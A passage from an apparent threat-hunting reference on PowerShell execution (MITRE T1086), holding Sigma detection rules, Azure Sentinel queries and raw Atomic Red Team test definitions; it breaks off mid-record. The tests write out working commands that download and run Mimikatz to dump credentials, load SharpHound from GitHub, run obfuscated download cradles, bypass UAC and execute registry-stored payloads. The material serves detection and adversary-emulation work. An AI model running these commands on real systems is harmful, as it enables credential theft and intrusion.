 {'data_source': {'author': 'John Lambert (rule)',
                  'description': 'Detects base64 encoded strings used in '
                                 'hidden malicious PowerShell command lines',
                  'detection': {'condition': 'encoded and selection',
                                'encoded': {'CommandLine': '* hidden *',
                                            'Image': '*\\powershell.exe'},
                                'selection': {'CommandLine': ['*AGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByA*',
                                                              '*aXRzYWRtaW4gL3RyYW5zZmVy*',
                                                              '*IAaQB0AHMAYQBkAG0AaQBuACAALwB0AHIAYQBuAHMAZgBlAHIA*',
                                                              '*JpdHNhZG1pbiAvdHJhbnNmZX*',
                                                              '*YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcg*',
                                                              '*Yml0c2FkbWluIC90cmFuc2Zlc*',
                                                              '*AGMAaAB1AG4AawBfAHMAaQB6AGUA*',
                                                              '*JABjAGgAdQBuAGsAXwBzAGkAegBlA*',
                                                              '*JGNodW5rX3Npem*',
                                                              '*QAYwBoAHUAbgBrAF8AcwBpAHoAZQ*',
                                                              '*RjaHVua19zaXpl*',
                                                              '*Y2h1bmtfc2l6Z*',
                                                              '*AE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4A*',
                                                              '*kATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8Abg*',
                                                              '*lPLkNvbXByZXNzaW9u*',
                                                              '*SQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuA*',
                                                              '*SU8uQ29tcHJlc3Npb2*',
                                                              '*Ty5Db21wcmVzc2lvb*',
                                                              '*AE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQ*',
                                                              '*kATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA*',
                                                              '*lPLk1lbW9yeVN0cmVhb*',
                                                              '*SQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0A*',
                                                              '*SU8uTWVtb3J5U3RyZWFt*',
                                                              '*Ty5NZW1vcnlTdHJlYW*',
                                                              '*4ARwBlAHQAQwBoAHUAbgBrA*',
                                                              '*5HZXRDaHVua*',
                                                              '*AEcAZQB0AEMAaAB1AG4Aaw*',
                                                              '*LgBHAGUAdABDAGgAdQBuAGsA*',
                                                              '*LkdldENodW5r*',
                                                              '*R2V0Q2h1bm*',
                                                              '*AEgAUgBFAEEARABfAEkATgBGAE8ANgA0A*',
                                                              '*QASABSAEUAQQBEAF8ASQBOAEYATwA2ADQA*',
                                                              '*RIUkVBRF9JTkZPNj*',
                                                              '*SFJFQURfSU5GTzY0*',
                                                              '*VABIAFIARQBBAEQAXwBJAE4ARgBPADYANA*',
                                                              '*VEhSRUFEX0lORk82N*',
                                                              '*AHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZA*',
                                                              '*cmVhdGVSZW1vdGVUaHJlYW*',
                                                              '*MAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkA*',
                                                              '*NyZWF0ZVJlbW90ZVRocmVhZ*',
                                                              '*Q3JlYXRlUmVtb3RlVGhyZWFk*',
                                                              '*QwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAVABoAHIAZQBhAGQA*',
                                                              '*0AZQBtAG0AbwB2AGUA*',
                                                              '*1lbW1vdm*',
                                                              '*AGUAbQBtAG8AdgBlA*',
                                                              '*bQBlAG0AbQBvAHYAZQ*',
                                                              '*bWVtbW92Z*',
                                                              '*ZW1tb3Zl*']}},
                  'falsepositives': ['Penetration tests'],
                  'id': 'f26c6093-6f14-4b12-800f-0fcb46f5ffd0',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['http://www.leeholmes.com/blog/2017/09/21/searching-for-content-in-base-64-strings/'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1086'],
                  'title': 'Malicious Base64 encoded PowerShell Keywords in '
                           'command lines'}},
 {'data_source': {'author': 'Florian Roth',
                  'description': 'Detects suspicious powershell invocations '
                                 'from interpreters or unusual programs',
                  'detection': {'condition': 'selection and not falsepositive',
                                'falsepositive': {'CurrentDirectory': '*\\Health '
                                                                      'Service '
                                                                      'State\\\\*'},
                                'selection': {'Image': ['*\\powershell.exe'],
                                              'ParentImage': ['*\\wscript.exe',
                                                              '*\\cscript.exe']}},
                  'falsepositives': ['Microsoft Operations Manager (MOM)',
                                     'Other scripts'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': '95eadcb2-92e4-4ed1-9031-92547773a6db',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.carbonblack.com/2017/03/15/attackers-leverage-excel-powershell-dns-latest-non-malware-attack/'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1086'],
                  'title': 'Suspicious PowerShell Invocation based on Parent '
                           'Process'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2019/01/09',
                  'description': 'Detects a suspicious command line execution '
                                 'that invokes PowerShell with reference to an '
                                 'AppData folder',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['* /c '
                                                              'powershell*\\AppData\\Local\\\\*',
                                                              '* /c '
                                                              'powershell*\\AppData\\Roaming\\\\*']}},
                  'falsepositives': ['Administrative scripts'],
                  'id': 'ac175779-025a-4f12-98b0-acdaeb77ea85',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://twitter.com/JohnLaTwC/status/1082851155481288706',
                                 'https://app.any.run/tasks/f87f1c4e-47e2-4c46-9cf4-31454c06ce03'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1086'],
                  'title': 'PowerShell Script Run in AppData'}}]
```

## Potential Queries

```json
[{'name': 'PowerShell',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and (process_path contains '
           '"powershell.exe"or process_path contains "powershell_ise.exe"or '
           'process_path contains "psexec.exe")'},
 {'name': 'PowerShell Downloads Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and (process_command_line contains '
           '"*.Download*"or process_command_line contains "*Net.WebClient*")'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: T1086 non-interactive PowerShell\n'
           'description: By explorer.exe powershell.exe to as parent, '
           'non-interactive PowerShell activity detected.\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'references: None\n'
           'logsource:\n'
           '\xa0\xa0\xa0\xa0product: windows\n'
           '\xa0\xa0\xa0\xa0service: security\n'
           'detection:\n'
           '\xa0\xa0\xa0\xa0selection:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 4688\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0NewProcessName: '* \\ "
           "powershell.exe'\n"
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0ParentProcessName: '* \\ "
           "explorer.exe'\n"
           '\xa0\xa0\xa0\xa0condition: selection\n'
           'falsepositives:\n'
           '\xa0\xa0\xa0\xa0- Unknown\n'
           'level: critical'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - PowerShell': {'atomic_tests': [{'description': 'Download '
                                                                         'Mimikatz '
                                                                         'and '
                                                                         'dump '
                                                                         'credentials. '
                                                                         'Upon '
                                                                         'execution, '
                                                                         'mimikatz '
                                                                         'dump '
                                                                         'details '
                                                                         'and '
                                                                         'password '
                                                                         'hashes '
                                                                         'will '
                                                                         'be '
                                                                         'displayed.\n',
                                                          'executor': {'command': 'powershell.exe '
                                                                                  '"IEX '
                                                                                  '(New-Object '
                                                                                  "Net.WebClient).DownloadString('#{mimurl}'); "
                                                                                  'Invoke-Mimikatz '
                                                                                  '-DumpCreds"\n',
                                                                       'elevation_required': True,
                                                                       'name': 'command_prompt'},
                                                          'input_arguments': {'mimurl': {'default': 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1',
                                                                                         'description': 'Mimikatz '
                                                                                                        'url',
                                                                                         'type': 'url'}},
                                                          'name': 'Mimikatz',
                                                          'supported_platforms': ['windows']},
                                                         {'dependencies': [{'description': 'SharpHound.ps1 '
                                                                                           'must '
                                                                                           'be '
                                                                                           'located '
                                                                                           'at '
                                                                                           '#{file_path}\n',
                                                                            'get_prereq_command': 'Invoke-WebRequest '
                                                                                                  '"https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" '
                                                                                                  '-OutFile '
                                                                                                  '"#{file_path}\\SharpHound.ps1"\n',
                                                                            'prereq_command': 'if '
                                                                                              '(Test-Path '
                                                                                              '#{file_path}\\SharpHound.ps1) '
                                                                                              '{exit '
                                                                                              '0} '
                                                                                              'else '
                                                                                              '{exit '
                                                                                              '1}\n'}],
                                                          'dependency_executor_name': 'powershell',
                                                          'description': 'Upon '
                                                                         'execution '
                                                                         'SharpHound '
                                                                         'will '
                                                                         'be '
                                                                         'downloaded '
                                                                         'to '
                                                                         'disk, '
                                                                         'imported '
                                                                         'and '
                                                                         'executed. '
                                                                         'It '
                                                                         'will '
                                                                         'set '
                                                                         'up '
                                                                         'collection '
                                                                         'methods, '
                                                                         'run '
                                                                         'and '
                                                                         'then '
                                                                         'compress '
                                                                         'and '
                                                                         'store '
                                                                         'the '
                                                                         'data '
                                                                         'to '
                                                                         'the '
                                                                         'temp '
                                                                         'directory '
                                                                         'on '
                                                                         'the '
                                                                         'machine. '
                                                                         'If '
                                                                         'system '
                                                                         'is '
                                                                         'unable '
                                                                         'to '
                                                                         'contact '
                                                                         'a '
                                                                         'domain, '
                                                                         'proper '
                                                                         'execution '
                                                                         'will '
                                                                         'not '
                                                                         'occur.\n'
                                                                         '\n'
                                                                         'Successful '
                                                                         'execution '
                                                                         'will '
                                                                         'produce '
                                                                         'stdout '
                                                                         'message '
                                                                         'stating '
                                                                         '"SharpHound '
                                                                         'Enumeration '
                                                                         'Completed". '
                                                                         'Upon '
                                                                         'completion, '
                                                                         'final '
                                                                         'output '
                                                                         'will '
                                                                         'be a '
                                                                         '*BloodHound.zip '
                                                                         'file.\n',
                                                          'executor': {'cleanup_command': 'Remove-Item '
                                                                                          '#{file_path}\\SharpHound.ps1 '
                                                                                          '-Force '
                                                                                          '-ErrorAction '
                                                                                          'Ignore\n'
                                                                                          'Remove-Item '
                                                                                          '$env:Temp\\*BloodHound.zip '
                                                                                          '-Force\n',
                                                                       'command': 'write-host '
                                                                                  '"Import '
                                                                                  'and '
                                                                                  'Execution '
                                                                                  'of '
                                                                                  'SharpHound.ps1 '
                                                                                  'from '
                                                                                  '#{file_path}" '
                                                                                  '-ForegroundColor '
                                                                                  'Cyan\n'
                                                                                  'import-module '
                                                                                  '#{file_path}\\SharpHound.ps1\n'
                                                                                  'Invoke-BloodHound '
                                                                                  '-OutputDirectory '
                                                                                  '$env:Temp\n'
                                                                                  'Start-Sleep '
                                                                                  '5\n',
                                                                       'elevation_required': False,
                                                                       'name': 'powershell'},
                                                          'input_arguments': {'file_path': {'default': 'PathToAtomicsFolder\\T1086\\src',
                                                                                            'description': 'File '
                                                                                                           'path '
                                                                                                           'for '
                                                                                                           'SharpHound '
                                                                                                           'payload',
                                                                                            'type': 'String'}},
                                                          'name': 'Run '
                                                                  'BloodHound '
                                                                  'from local '
                                                                  'disk',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Upon '
                                                                         'execution '
                                                                         'SharpHound '
                                                                         'will '
                                                                         'load '
                                                                         'into '
                                                                         'memory '
                                                                         'and '
                                                                         'execute '
                                                                         'against '
                                                                         'a '
                                                                         'domain. '
                                                                         'It '
                                                                         'will '
                                                                         'set '
                                                                         'up '
                                                                         'collection '
                                                                         'methods, '
                                                                         'run '
                                                                         'and '
                                                                         'then '
                                                                         'compress '
                                                                         'and '
                                                                         'store '
                                                                         'the '
                                                                         'data '
                                                                         'to '
                                                                         'the '
                                                                         'temp '
                                                                         'directory. '
                                                                         'If '
                                                                         'system '
                                                                         'is '
                                                                         'unable '
                                                                         'to '
                                                                         'contact '
                                                                         'a '
                                                                         'domain, '
                                                                         'proper '
                                                                         'execution '
                                                                         'will '
                                                                         'not '
                                                                         'occur.\n'
                                                                         '\n'
                                                                         'Successful '
                                                                         'execution '
                                                                         'will '
                                                                         'produce '
                                                                         'stdout '
                                                                         'message '
                                                                         'stating '
                                                                         '"SharpHound '
                                                                         'Enumeration '
                                                                         'Completed". '
                                                                         'Upon '
                                                                         'completion, '
                                                                         'final '
                                                                         'output '
                                                                         'will '
                                                                         'be a '
                                                                         '*BloodHound.zip '
                                                                         'file.\n',
                                                          'executor': {'cleanup_command': 'Remove-Item '
                                                                                          '$env:Temp\\*BloodHound.zip '
                                                                                          '-Force\n',
                                                                       'command': 'write-host '
                                                                                  '"Remote '
                                                                                  'download '
                                                                                  'of '
                                                                                  'SharpHound.ps1 '
                                                                                  'into '
                                                                                  'memory, '
                                                                                  'followed '
                                                                                  'by '
                                                                                  'execution '
                                                                                  'of '
                                                                                  'the '
                                                                                  'script" '
                                                                                  '-ForegroundColor '
                                                                                  'Cyan\n'
                                                                                  'IEX '
                                                                                  '(New-Object '
                                                                                  "Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\n"
                                                                                  'Invoke-BloodHound '
                                                                                  '-OutputDirectory '
                                                                                  '$env:Temp\n'
                                                                                  'Start-Sleep '
                                                                                  '5\n',
                                                                       'elevation_required': False,
                                                                       'name': 'powershell'},
                                                          'name': 'Run '
                                                                  'Bloodhound '
                                                                  'from Memory '
                                                                  'using '
                                                                  'Download '
                                                                  'Cradle',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Different '
                                                                         'obfuscated '
                                                                         'methods '
                                                                         'to '
                                                                         'test. '
                                                                         'Upon '
                                                                         'execution, '
                                                                         'reaches '
                                                                         'out '
                                                                         'to '
                                                                         'bit.ly/L3g1t '
                                                                         'and '
                                                                         'displays: '
                                                                         '"SUCCESSFULLY '
                                                                         'EXECUTED '
                                                                         'POWERSHELL '
                                                                         'CODE '
                                                                         'FROM '
                                                                         'REMOTE '
                                                                         'LOCATION"\n',
                                                          'executor': {'command': '(New-Object '
                                                                                  "Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\n"
                                                                                  '(New-Object '
                                                                                  "Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()\n"
                                                                                  'Set-Variable '
                                                                                  'HJ1 '
                                                                                  "'http://bit.ly/L3g1tCrad1e';SI "
                                                                                  'Variable:/0W '
                                                                                  "'Net.WebClient';Set-Item "
                                                                                  'Variable:\\gH '
                                                                                  "'Default_File_Path.ps1';ls "
                                                                                  '_-*;Set-Variable '
                                                                                  'igZ '
                                                                                  "(.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem "
                                                                                  'Variable:0W).Value);Set-Variable '
                                                                                  'J '
                                                                                  '((((Get-Variable '
                                                                                  'igZ '
                                                                                  "-ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable "
                                                                                  'igZ '
                                                                                  '-ValueOn).((ChildItem '
                                                                                  'Variable:J).Value).Invoke((Get-Item '
                                                                                  'Variable:/HJ1).Value,(GV '
                                                                                  'gH).Value);&( '
                                                                                  "''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT "
                                                                                  '-Enco '
                                                                                  '3 '
                                                                                  '(GV '
                                                                                  'gH).Value)))\n',
                                                                       'elevation_required': False,
                                                                       'name': 'powershell'},
                                                          'name': 'Obfuscation '
                                                                  'Tests',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Run '
                                                                         'mimikatz '
                                                                         'via '
                                                                         'PsSendKeys. '
                                                                         'Upon '
                                                                         'execution, '
                                                                         'automated '
                                                                         'actions '
                                                                         'will '
                                                                         'take '
                                                                         'place '
                                                                         'to '
                                                                         'open '
                                                                         'file '
                                                                         'explorer, '
                                                                         'open '
                                                                         'notepad '
                                                                         'and '
                                                                         'input '
                                                                         'code, '
                                                                         'then '
                                                                         'mimikatz '
                                                                         'dump '
                                                                         'info '
                                                                         'will '
                                                                         'be '
                                                                         'displayed.\n',
                                                          'executor': {'command': "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object "
                                                                                  '-ComObject '
                                                                                  "WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty "
                                                                                  "$reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP "
                                                                                  '$reg '
                                                                                  '(Item '
                                                                                  'Variable:_).Value[0] '
                                                                                  '(Variable '
                                                                                  '_).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item '
                                                                                  'Variable:_).Value.id-ieq$curpid}|ForEach{(Variable '
                                                                                  '_).Value.MainWindowTitle})){Start-Sleep '
                                                                                  '-Milliseconds '
                                                                                  '500};While(!$wshell.AppActivate($title)){Start-Sleep '
                                                                                  '-Milliseconds '
                                                                                  "500};$wshell.SendKeys('^o');Start-Sleep "
                                                                                  '-Milliseconds '
                                                                                  "500;@($url,(' "
                                                                                  "'*1000),'~')|ForEach{$wshell.SendKeys((Variable "
                                                                                  '_).Value)};$res=$Null;While($res.Length '
                                                                                  '-lt '
                                                                                  "2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item "
                                                                                  'Variable:_).Value)};Start-Sleep '
                                                                                  '-Milliseconds '
                                                                                  "500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable "
                                                                                  '_).Value)};If(GPS|?{(Item '
                                                                                  "Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item "
                                                                                  "Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP "
                                                                                  '$reg '
                                                                                  '(Item '
                                                                                  'Variable:_).Value '
                                                                                  '$props.((Variable '
                                                                                  '_).Value)};IEX($res);invoke-mimikatz '
                                                                                  '-dumpcr\n',
                                                                       'elevation_required': True,
                                                                       'name': 'powershell'},
                                                          'name': 'Mimikatz - '
                                                                  'Cradlecraft '
                                                                  'PsSendKeys',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Note: '
                                                                         'Windows '
                                                                         '10 '
                                                                         'only. '
                                                                         'Upon '
                                                                         'execution '
                                                                         'windows '
                                                                         'backup '
                                                                         'and '
                                                                         'restore '
                                                                         'window '
                                                                         'will '
                                                                         'be '
                                                                         'opened.\n'
                                                                         '\n'
                                                                         'Bypass '
                                                                         'is '
                                                                         'based '
                                                                         'on: '
                                                                         'https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n',
                                                          'executor': {'command': 'Powershell.exe '
                                                                                  '"IEX '
                                                                                  '(New-Object '
                                                                                  "Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); "
                                                                                  'Invoke-AppPathBypass '
                                                                                  '-Payload '
                                                                                  '\'C:\\Windows\\System32\\cmd.exe\'"\n',
                                                                       'elevation_required': False,
                                                                       'name': 'command_prompt'},
                                                          'name': 'Invoke-AppPathBypass',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Powershell '
                                                                         'MsXml '
                                                                         'COM '
                                                                         'object. '
                                                                         'Not '
                                                                         'proxy '
                                                                         'aware, '
                                                                         'removing '
                                                                         'cache '
                                                                         'although '
                                                                         'does '
                                                                         'not '
                                                                         'appear '
                                                                         'to '
                                                                         'write '
                                                                         'to '
                                                                         'those '
                                                                         'locations. '
                                                                         'Upon '
                                                                         'execution, '
                                                                         '"Download '
                                                                         'Cradle '
                                                                         'test '
                                                                         'success!" '
                                                                         'will '
                                                                         'be '
                                                                         'displayed.\n'
                                                                         '\n'
                                                                         'Provided '
                                                                         'by '
                                                                         'https://github.com/mgreen27/mgreen27.github.io\n',
                                                          'executor': {'command': 'powershell.exe '
                                                                                  '-exec '
                                                                                  'bypass '
                                                                                  '-noprofile '
                                                                                  '"$comMsXml=New-Object '
                                                                                  '-ComObject '
                                                                                  "MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX "
                                                                                  '$comMsXml.ResponseText"\n',
                                                                       'elevation_required': False,
                                                                       'name': 'command_prompt'},
                                                          'input_arguments': {'url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.ps1',
                                                                                      'description': 'url '
                                                                                                     'of '
                                                                                                     'payload '
                                                                                                     'to '
                                                                                                     'execute',
                                                                                      'type': 'url'}},
                                                          'name': 'Powershell '
                                                                  'MsXml COM '
                                                                  'object - '
                                                                  'with prompt',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Powershell '
                                                                         'xml '
                                                                         'download '
                                                                         'request. '
                                                                         'Upon '
                                                                         'execution, '
                                                                         '"Download '
                                                                         'Cradle '
                                                                         'test '
                                                                         'success!" '
                                                                         'will '
                                                                         'be '
                                                                         'dispalyed.\n'
                                                                         '\n'
                                                                         'Provided '
                                                                         'by '
                                                                         'https://github.com/mgreen27/mgreen27.github.io\n',
                                                          'executor': {'command': '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" '
                                                                                  '-exec '
                                                                                  'bypass '
                                                                                  '-noprofile '
                                                                                  '"$Xml '
                                                                                  '= '
                                                                                  '(New-Object '
                                                                                  "System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute "
                                                                                  '| '
                                                                                  'IEX"\n',
                                                                       'elevation_required': False,
                                                                       'name': 'command_prompt'},
                                                          'input_arguments': {'url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.xml',
                                                                                      'description': 'url '
                                                                                                     'of '
                                                                                                     'payload '
                                                                                                     'to '
                                                                                                     'execute',
                                                                                      'type': 'url'}},
                                                          'name': 'Powershell '
                                                                  'XML '
                                                                  'requests',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Powershell '
                                                                         'invoke '
                                                                         'mshta '
                                                                         'to '
                                                                         'download '
                                                                         'payload. '
                                                                         'Upon '
                                                                         'execution, '
                                                                         'a '
                                                                         'new '
                                                                         'PowerShell '
                                                                         'window '
                                                                         'will '
                                                                         'be '
                                                                         'opened '
                                                                         'which '
                                                                         'will '
                                                                         'display '
                                                                         '"Download '
                                                                         'Cradle '
                                                                         'test '
                                                                         'success!".\n'
                                                                         '\n'
                                                                         'Provided '
                                                                         'by '
                                                                         'https://github.com/mgreen27/mgreen27.github.io\n',
                                                          'executor': {'command': 'C:\\Windows\\system32\\cmd.exe '
                                                                                  '/c '
                                                                                  '"mshta.exe '
                                                                                  'javascript:a=GetObject(\'script:#{url}\').Exec();close()"\n',
                                                                       'elevation_required': False,
                                                                       'name': 'command_prompt'},
                                                          'input_arguments': {'url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/mshta.sct',
                                                                                      'description': 'url '
                                                                                                     'of '
                                                                                                     'payload '
                                                                                                     'to '
                                                                                                     'execute',
                                                                                      'type': 'url'}},
                                                          'name': 'Powershell '
                                                                  'invoke '
                                                                  'mshta.exe '
                                                                  'download',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Provided '
                                                                         'by '
                                                                         'https://github.com/mgreen27/mgreen27.github.io\n'
                                                                         'Invoke-DownloadCradle '
                                                                         'is '
                                                                         'used '
                                                                         'to '
                                                                         'generate '
                                                                         'Network '
                                                                         'and '
                                                                         'Endpoint '
                                                                         'artifacts.\n',
                                                          'executor': {'name': 'manual',
                                                                       'steps': '1. '
                                                                                'Open '
                                                                                'Powershell_ise '
                                                                                'as '
                                                                                'a '
                                                                                'Privileged '
                                                                                'Account\n'
                                                                                '2. '
                                                                                'Invoke-DownloadCradle.ps1\n'},
                                                          'name': 'Powershell '
                                                                  'Invoke-DownloadCradle',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Execution '
                                                                         'of a '
                                                                         'PowerShell '
                                                                         'payload '
                                                                         'from '
                                                                         'the '
                                                                         'Windows '
                                                                         'Registry '
                                                                         'similar '
                                                                         'to '
                                                                         'that '
                                                                         'seen '
                                                                         'in '
                                                                         'fileless '
                                                                         'malware '
                                                                         'infections. '
                                                                         'Upon '
                                                                         'exection, '
                                                                         'open '
                                                                         '"C:\\Windows\\Temp" '
                                                                         'and '
                                                                         'verify '
                                                                         'that\n'
                                                                         'art-marker.txt '
                                                                         'is '
                                                                         'in '
                                                                         'the '
                                                                         'folder.\n',
                                                          'executor': {'cleanup_command': 'Remove-Item '
                                                                                          '-path '
                                                                                          'C:\\Windows\\Temp\\art-marker.txt '
                                                                                          '-Force '
                                                                                          '-ErrorAction '
                                                                                          'Ignore\n'
                                                                                          'Remove-Item '
                                                                                          'HKCU:\\Software\\Classes\\AtomicRedTeam '
                                                                                          '-Force '
                                                                                          '-ErrorAction '
                                                                                          'Ignore\n',
                                                                       'command': '# '
                                                                                  'Encoded '
                                                                                  'payload '
                                                                                  'in '
                                                                                  'next '
                                                                                  'command '
                                                                                  'is '
                                                                                  'the '
                                                                                  'following '
                                                                                  '"Set-Content '
                                                                                  '-path '
                                                                                  '"$env:SystemRoot/Temp/art-marker.txt" '
                                                                                  '-value '
                                                                                  '"Hello '
                                                                                  'from '
                                                                                  'the '
                                                                                  'Atomic '
                                                                                  'Red '
                                                                                  'Team""\n'
                                                                                  'reg.exe '
                                                                                  'add '
                                                                                  '"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam" '
                                                                                  '/v '
                                                                                  'ART '
                                                                                  '/t '
                                                                                  'REG_SZ '
                                                                                  '/d '
                                                                                  '"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="\n'
                                                                                  'iex '
                                                                                  '([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp '
                                                                                  "'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n",
                                                                       'elevation_required': True,
                                                                       'name': 'powershell'},
                                                          'name': 'PowerShell '
                                                                  'Fileless '
                                                                  'Script '
                                                                  'Execution',
                                                          'supported_platforms': ['windows']},
                                                         {'dependencies': [{'description': 'PowerShell '
                                                                                           'version '
                                                                                           '2 '
                                                                                           'must '
                                                                                           'be '
                                                                                           'installed\n',
                                                                            'get_prereq_command': 'Write-Host  '
                                                                                                  'Automated '
                                                                                                  'installer '
                                                                                                  'not '
                                                                                                  'implemented '
                                                                                                  'yet, '
                                                                                                  'please '
                                                                                                  'install '
                                                                                                  'PowerShell '
                                                                                                  'v2 '
                                                                                                  'manually\n',
                                                                            'prereq_command': 'if(2 '
                                                                                              '-in '
                                                                                              '$PSVersionTable.PSCompatibleVersions.Major) '
                                                                                              '{exit '
                                                                                              '0} '
                                                                                              'else '
                                                                                              '{exit '
                                                                                              '1}\n'}],
                                                          'description': 'This '
                                                                         'test '
                                                                         'requires '
                                                                         'the '
                                                                         'manual '
                                                                         'installation '
                                                                         'of '
                                                                         'PowerShell '
                                                                         'V2.\n'
                                                                         '\n'
                                                                         'Attempts '
                                                                         'to '
                                                                         'run '
                                                                         'powershell '
                                                                         'commands '
                                                                         'in '
                                                                         'version '
                                                                         '2.0 '
                                                                         'https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n',
                                                          'executor': {'command': 'powershell.exe '
                                                                                  '-version '
                                                                                  '2 '
                                                                                  '-Command '
                                                                                  'Write-Host '
                                                                                  '$PSVersion\n',
                                                                       'elevation_required': False,
                                                                       'name': 'powershell'},
                                                          'name': 'PowerShell '
                                                                  'Downgrade '
                                                                  'Attack',
                                                          'supported_platforms': ['windows']},
                                                         {'dependencies': [{'description': 'Homedrive '
                                                                                           'must '
                                                                                           'be '
                                                                                           'an '
                                                                                           'NTFS '
                                                                                           'drive\n',
                                                                            'get_prereq_command': 'Write-Host '
                                                                                                  "Prereq's "
                                                                                                  'for '
                                                                                                  'this '
                                                                                                  'test '
                                                                                                  'cannot '
                                                                                                  'be '
                                                                                                  'met '
                                                                                                  'automatically\n',
                                                                            'prereq_command': 'if((Get-Volume '
                                                                                              '-DriveLetter '
                                                                                              '$env:HOMEDRIVE[0]).FileSystem '
                                                                                              '-contains '
